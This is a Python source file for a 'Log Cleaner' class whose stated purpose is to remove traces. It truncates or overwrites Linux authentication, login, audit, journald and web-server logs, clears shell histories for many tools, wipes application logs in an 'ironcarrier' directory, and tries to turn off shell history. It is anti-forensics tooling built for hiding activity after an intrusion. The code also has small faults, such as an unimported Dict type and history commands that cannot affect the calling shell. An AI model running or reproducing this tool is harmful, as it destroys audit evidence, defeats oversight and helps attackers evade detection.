#!/usr/bin/env python3
"""
Log Cleaner
Clear system logs to remove traces
"""

import os
import shutil
import gzip
import time
from pathlib import Path
from typing import List, Optional


class LogCleaner:
    """System log cleaner"""
    
    LINUX_LOGS = [
        '/var/log/syslog',
        '/var/log/auth.log',
        '/var/log/kern.log',
        '/var/log/messages',
        '/var/log/wtmp',
        '/var/log/btmp',
        '/var/log/lastlog',
        '/var/log/faillog',
        '/var/log/boot.log',
        '/var/log/dmesg',
        '/var/log/daemon.log',
        '/var/log/user.log',
        '/var/log/cron',
        '/var/log/mail.log',
        '/var/log/security/audit/audit.log',
        '/var/log/journal/',
        '/var/log/mysql/',
        '/var/log/postgresql/',
        '/var/log/nginx/',
        '/var/log/apache2/',
        '/var/log/ssh.log',
    ]
    
    SHELL_HISTORY = [
        '~/.bash_history',
        '~/.zsh_history',
        '~/.fish_history',
        '~/.python_history',
        '~/.node_repl_history',
        '~/.mysql_history',
        '~/.psql_history',
        '~/.rediscli_history',
        '~/.local/share/powershell/PSReadLine/ConsoleHost_history.txt',
    ]
    
    APPLICATION_LOGS = [
        '~/.local/share/ironcarrier/',
        'logs/',
        './logs/',
    ]
    
    def __init__(self, compress: bool = False, secure_delete: bool = False, passes: int = 3):
        self.compress = compress
        self.secure_delete = secure_delete
        self.passes = passes
        self._cleared = []
        self._failed = []
    
    def _secure_wipe(self, filepath: Path) -> bool:
        """Securely delete file by overwriting"""
        try:
            size = filepath.stat().st_size
            with open(filepath, 'wb') as f:
                for _ in range(self.passes):
                    f.seek(0)
                    f.write(os.urandom(size))
                    f.flush()
                    os.fsync(f.fileno())
            os.unlink(filepath)
            return True
        except Exception:
            try:
                os.unlink(filepath)
            except Exception:
                return False
    
    def _truncate(self, filepath: Path) -> bool:
        """Truncate file to zero bytes"""
        try:
            with open(filepath, 'wb') as f:
                f.truncate(0)
            return True
        except Exception:
            return False
    
    def clear_file(self, filepath: str, method: str = 'truncate') -> bool:
        """Clear single log file"""
        path = Path(filepath).expanduser()
        
        if not path.exists():
            return False
        
        if method == 'secure':
            return self._secure_wipe(path)
        elif method == 'truncate':
            return self._truncate(path)
        elif method == 'delete':
            try:
                os.unlink(path)
                return True
            except Exception:
                return False
        
        return False
    
    def clear_log(self, log_path: str) -> bool:
        """Clear a log file, handle special cases"""
        path = Path(log_path).expanduser()
        
        if not path.exists():
            return False
        
        # Handle journalctl logs
        if path.is_dir():
            try:
                if 'journal' in str(path):
                    os.system('journalctl --rotate --vacuum-size=0 2>/dev/null')
                    return True
                # Recursively handle directory
                for f in path.rglob('*'):
                    if f.is_file():
                        self._truncate(f)
                return True
            except Exception:
                return False
        
        # Handle wtmp/btmp (binary logs)
        if path.name in ['wtmp', 'btmp', 'lastlog', 'faillog']:
            try:
                with open(path, 'wb') as f:
                    f.truncate(0)
                return True
            except Exception:
                return False
        
        return self._truncate(path)
    
    def clear_shell_history(self) -> int:
        """Clear all shell history files"""
        count = 0
        for hist in self.SHELL_HISTORY:
            path = Path(hist).expanduser()
            if path.exists():
                if self._truncate(path):
                    count += 1
                    self._cleared.append(str(path))
        return count
    
    def clear_system_logs(self) -> int:
        """Clear Linux system logs"""
        count = 0
        for log in self.LINUX_LOGS:
            path = Path(log).expanduser()
            if path.exists():
                if self.clear_log(str(path)):
                    count += 1
                    self._cleared.append(str(path))
                else:
                    self._failed.append(str(path))
        return count
    
    def clear_application_logs(self) -> int:
        """Clear application-specific logs"""
        count = 0
        for log_dir in self.APPLICATION_LOGS:
            path = Path(log_dir).expanduser()
            if path.exists():
                if path.is_dir():
                    for f in path.rglob('*.log'):
                        if self._truncate(f):
                            count += 1
                            self._cleared.append(str(f))
                elif path.is_file():
                    if self._truncate(path):
                        count += 1
                        self._cleared.append(str(path))
        return count
    
    def clear_all(self) -> Dict[str, int]:
        """Clear all traces"""
        shell = self.clear_shell_history()
        system = self.clear_system_logs()
        apps = self.clear_application_logs()
        
        # Unset history in current shell
        os.system('unset HISTFILE 2>/dev/null')
        os.system('export HISTSIZE=0')
        os.system('export HISTFILESIZE=0')
        
        return {
            'shell_history': shell,
            'system_logs': system,
            'application_logs': apps,
            'total': shell + system + apps,
            'cleared': self._cleared,
            'failed': self._failed,
        }
    
    def compress_logs(self, log_dir: str = '/var/log') -> int:
        """Compress old logs"""
        count = 0
        path = Path(log_dir).expanduser()
        
        if not path.exists():
            return 0
        
        for logfile in path.rglob('*.log.*'):
            if logfile.suffix in ('.gz', '.bz2', '.xz'):
                continue
            
            try:
                with open(logfile, 'rb') as f_in:
                    with gzip.open(str(logfile) + '.gz', 'wb') as f_out:
                        f_out.writelines(f_in)
                logfile.unlink()
                count += 1
            except Exception:
                self._failed.append(str(logfile))
        
        return count
    
    def print_report(self) -> None:
        """Print cleanup report"""
        print(f"\n  Log Cleanup Report")
        print(f"  {'─' * 40}")
        print(f"  Cleared: {len(self._cleared)}")
        
        if self._failed:
            print(f"\n  Failed:")
            for f in self._failed:
                print(f"    - {f}")
        
        print(f"  Total: {len(self._cleared) + len(self._failed)}")
        print()
